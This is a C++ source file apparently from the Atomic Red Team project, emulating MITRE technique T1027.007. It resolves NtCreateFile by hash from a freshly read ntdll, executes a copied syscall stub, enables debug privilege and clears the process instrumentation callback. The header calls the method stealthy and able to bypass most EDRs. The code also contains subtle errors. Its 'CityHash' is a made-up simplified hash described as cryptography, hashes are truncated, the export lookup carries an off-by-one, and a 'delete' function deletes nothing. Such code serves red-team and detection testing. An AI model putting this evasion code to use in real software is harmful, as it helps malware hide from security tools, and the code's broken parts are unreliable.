/**
Author: Thomas X Meng
Atomic Red Team
T1027.007: Obfuscated Files or Information: Dynamic API Resolution
Ninja syscall code execution technique. Ninja syscall 1 dynamically resolves the native API function call’s RVA from ntdll on disk 
by its hash value. It uses CityHash, a lightweight cryptography method, to avoid hash collisions. 
Then it stores the API function's call stub in the heap. 
It then declares an API function prototype and initialises it to point to the syscall stub stored in the heap. 
Then it invokes the API function. The function name will neither appear in IAT/EAT nor within the code. 
AV would not detect the call from function hooked in ntdll. 
This technique is stealthy and can bypass most EDRs.
No memory allocation or permission settings APIs.
**/
#include <windows.h>
#include <iostream>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include "winternl.h"
#pragma comment(lib, "ntdll")
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif


// syscall stub preparation:
int const SYSCALL_STUB_SIZE = 23;
using myNtCreateFile = NTSTATUS(NTAPI*)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);

PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
{
	return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData);
}

BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	BOOL stubFound = FALSE; 

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
		if (strcmp(functionNameResolved, functionName) == 0)
		{
            printf("[+] Address of %s in manual loaded ntdll export table: %p\n", functionName, (void*)functionVA);
			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
			stubFound = TRUE;
			printf("[+] Syscall stub for %s found.\n", functionName);
            // Print the syscall stub bytes
            printf("[+] Syscall stub bytes: ");
            for (int i = 0; i < SYSCALL_STUB_SIZE; i++) {
                printf("%02X ", ((unsigned char*)syscallStub)[i]);
            }
            printf("\n");
			break;
		}
	}

	if (!stubFound) {
		printf("[-] Syscall stub for %s not found.\n", functionName);
	}
	return stubFound;
}

// API-hashing preparation: 
// City hash
class CityHash {
public:
    uint64_t CityHash64(const char *buf, size_t len) {
        if (len <= 32) {
            if (len <= 16) {
                return HashLen0to16(buf, len);
            } else {
                return HashLen17to32(buf, len);
            }
        } else if (len <= 64) {
            return HashLen33to64(buf, len);
        }

        // For strings over 64 characters, CityHash uses a more complex algorithm
        // which is too lengthy to implement here. The official CityHash
        // implementation should be used for such cases.

        // Simplified version for longer strings:
        uint64_t hash = 0;
        for (size_t i = 0; i < len; ++i) {
            hash = hash * 33 + buf[i];
        }
        return hash;
    }

private:
    uint64_t HashLen0to16(const char* s, size_t len) {
        // Simplified hashing for short strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 33 + s[i];
        }
        return (a << 1) ^ b;
    }

    uint64_t HashLen17to32(const char* s, size_t len) {
        // Simplified hashing for medium strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 31 + s[i];
            b = b * 29 + s[i];
        }
        return (a << 2) ^ b;
    }

    uint64_t HashLen33to64(const char* s, size_t len) {
        // Simplified hashing for larger strings
        uint64_t a = 0, b = 0;
        for (size_t i = 0; i < len; ++i) {
            a = a * 37 + s[i];
            b = b * 39 + s[i];
        }
        return (a << 3) ^ b;
    }
};

CityHash cityHasher;

uint64_t getHashFromString(const char *string) {
    size_t stringLength = strnlen_s(string, 50);
    // Using CityHash to compute the hash
    return cityHasher.CityHash64(string, stringLength);
}


BOOL GetSyscallStubMem(DWORD functionHash, LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub)
{
	PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection);
	PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection);
	BOOL stubFound = FALSE; 

	for (size_t i = 0; i < exportDirectory->NumberOfNames; i++)
	{
		DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection);
		DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);
		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
        char *functionNameResolvedResolved = (char *)functionNameResolved;
        DWORD functionNameHash = getHashFromString(functionNameResolvedResolved);

        if (functionNameHash == functionHash) // Corrected comparison
		{
            printf("[+] Address of %s in manual loaded ntdll export table: %p with hash: 0x%x\n", functionName, (void*)functionVA, functionNameHash);
            memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE); //This
			stubFound = TRUE;
			printf("[+] Syscall stub for %s found.\n", functionName);
            // Print the syscall stub bytes
            printf("[+] Syscall stub bytes: ");
            for (int i = 0; i < SYSCALL_STUB_SIZE; i++) {
                printf("%02X ", ((unsigned char*)syscallStub)[i]);
            }
            printf("\n");
			break;
		}
	}

	if (!stubFound) {
		printf("[-] Syscall stub for %s not found.\n", functionName);
	}
	return stubFound;
}


/// Enable debug priv preparation:
// Function prototype for RtlAdjustPrivilege
typedef NTSTATUS (NTAPI *pfnRtlAdjustPrivilege)(
    ULONG Privilege,
    BOOLEAN Enable,
    BOOLEAN CurrentThread,
    PBOOLEAN Enabled
);

// Function prototype for NtSetInformationProcess
typedef NTSTATUS (NTAPI *pfnNtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

// Define SE_DEBUG_PRIVILEGE
#define SE_DEBUG_PRIVILEGE 20
typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION {
    ULONG Version;
    ULONG Reserved;
    PVOID Callback;
} PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION;


// Check and delete file: 
bool checkAndDeleteFile(const WCHAR* filePath) {
    // Check if the file exists
    if (GetFileAttributesW(filePath) != INVALID_FILE_ATTRIBUTES) {
        printf("[+] File name: %ls successfully created via dynamic syscall resolved by API-hashing \n", filePath);
    } else {
        wprintf(L"[-] File does not exist.\n");
        return false;
    }
}

int main()
{

    HANDLE hProcess = GetCurrentProcess();

    // Load ntdll.dll
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (hNtdll == NULL) {
        printf("[-] Error loading ntdll.dll.\n");
        return 1;
    } else {
        printf("[+] Loaded ntdll.dll successfully.\n");
    }

    // Get the address of RtlAdjustPrivilege
    pfnRtlAdjustPrivilege RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    if (RtlAdjustPrivilege == NULL) {
        printf("[-] Failed to get the address of RtlAdjustPrivilege.\n");
        FreeLibrary(hNtdll);
        return 1;
    } else {
        printf("[+] Obtained address of RtlAdjustPrivilege successfully.\n");
    }
    

    // Get the address of NtSetInformationProcess
    pfnNtSetInformationProcess NtSetInformationProcess = (pfnNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (NtSetInformationProcess == NULL) {
        printf("[-] Failed to get the address of NtSetInformationProcess.\n");
        FreeLibrary(hNtdll);
        return 1;
    } else {
        printf("[+] Obtained address of NtSetInformationProcess successfully.\n");
    }

    BOOLEAN SeDebugWasEnabled;
    NTSTATUS Status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
    if (Status != STATUS_SUCCESS) {
        printf("[-] Error adjusting privilege: %lx\n", Status);
        FreeLibrary(hNtdll);
        return 1;
    } else {
        printf("[+] Privilege adjusted successfully.\n");
    }

    // Parameters for NtCreateFile: 
    HMODULE hNtdllDefault = GetModuleHandleA("ntdll.dll");
    if (hNtdllDefault == NULL) {
        printf("[-] Failed to get handle of the default loaded ntdll.dll.\n");
        return -1;
    } else {
        printf("[+] Memory address of the default loaded ntdll.dll: %p\n", hNtdllDefault);
    }

	char syscallStub[SYSCALL_STUB_SIZE] = {};
	SIZE_T bytesWritten = 0;
	DWORD oldProtection = 0;
	HANDLE file = NULL;
	DWORD fileSize = 0; 
	DWORD bytesRead = 0; 
	LPVOID fileData = NULL;
	
    auto RtlInitUnicodeString = reinterpret_cast<void(WINAPI *)(PUNICODE_STRING, PCWSTR)>(GetProcAddress(hNtdll, "RtlInitUnicodeString"));
    if (!RtlInitUnicodeString) {
        printf("[-] Failed to get address of RtlInitUnicodeString.\n");
        FreeLibrary(hNtdll);
        return -1;
    }

	// variables for NtCreateFile
	OBJECT_ATTRIBUTES oa;
	HANDLE fileHandle = NULL;
	NTSTATUS status = 0; 
	UNICODE_STRING fileName;

    WCHAR filePath[] = L"\\??\\C:\\Users\\Default\\AppData\\Local\\Temp\\hello.log";

    RtlInitUnicodeString(&fileName, (PCWSTR)filePath);
	IO_STATUS_BLOCK osb;
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL);


    /** Manually load fresh ntdll  **/
	
	file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	ReadFile(file, fileData, fileSize, &bytesRead, NULL);
    // Print the memory location of loaded ntdll.dll
    printf("[+] Memory location of loaded ntdll.dll: %p\n", fileData);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;
	
    bool rdataSectionFound = false;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) 
    {
        if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) { 
            rdataSection = section;
            printf("[+] .rdata section found.\n");
            rdataSectionFound = true;
            break;
        }
        section++;
    }

    if (!rdataSectionFound) {
        printf("[-] .rdata section not found.\n");
    }


	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);


    /** Initialise and call the function  **/
	// define NtCreateFile prototype, and point it to syscallStub. You can change its name to any strings you like.
	myNtCreateFile NtCreateFile = (myNtCreateFile)(LPVOID)syscallStub;
    // printf("[+] Memory location of NtCreateFile syscall stub outwith ETA: %p\n", (void*)NtCreateFile);
	VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

    DWORD hashCreateFile = getHashFromString("NtCreateFile");
    printf("hash of function CreateFile: 0x%x\n", hashCreateFile);

	if (GetSyscallStubMem(hashCreateFile, "NtCreateFile", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
        printf("[+] Memory location of NtCreateFile syscall stub outwith EAT: %p\n", (void*)NtCreateFile);

        NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
		printf("[+] NtCreateFile executed successfully.\n");
	} else {
		printf("[-] Failed to execute NtCreateFile.\n");
	}
    
    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;
    InstrumentationCallbackInfo.Version = 0;
    InstrumentationCallbackInfo.Reserved = 0;
    InstrumentationCallbackInfo.Callback = NULL;

    Status = NtSetInformationProcess(
        hProcess,
        ProcessInstrumentationCallback, // Ensure this is the correct PROCESSINFOCLASS value
        &InstrumentationCallbackInfo,
        sizeof(InstrumentationCallbackInfo)
    );

    if (Status != STATUS_SUCCESS) {
        printf("[-] Error removing the callback: %lx\n", Status);
    } else {
        printf("[+] Callback removed successfully.\n");
    }


    // revert the protection.
    // VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    checkAndDeleteFile(filePath);
    printf("[+] Successful! Ctrl+C to exit.\n");


	Sleep(1000);
    return 0;
}
